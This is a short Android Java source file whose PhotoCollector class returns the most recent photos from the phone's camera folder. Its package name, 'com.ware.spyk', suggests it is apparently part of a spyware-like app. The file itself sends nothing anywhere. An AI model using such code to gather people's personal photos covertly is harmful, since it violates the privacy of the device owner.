package com.ware.spyk;

import android.content.Context;
import android.os.Environment;
import android.util.Log;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

public class PhotoCollector {

    public static File[] getRecentPhotos(Context context, int max) {
        Log.d("PhotoCollector", "getRecentPhotos");
        File dcim = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
        File camera = new File(dcim, "Camera");
        Log.d("PhotoCollector", "camera = " + camera.getAbsolutePath());
        Log.d("PhotoCollector", "canRead = " + camera.canRead());
        if (!camera.exists() || !camera.isDirectory())
        {
            Log.d("PhotoCollector", "Aucun dossier Camera trouvé");
            return new File[0];
        }

        File[] files = camera.listFiles((dir, name) -> name.endsWith(".jpg") || name.endsWith(".jpeg") || name.endsWith(".png"));
        if (files == null) return new File[0];

        // Trie par date décroissante
        java.util.Arrays.sort(files, (a, b) -> Long.compare(b.lastModified(), a.lastModified()));

        return java.util.Arrays.copyOfRange(files, 0, Math.min(max, files.length));
    }
}
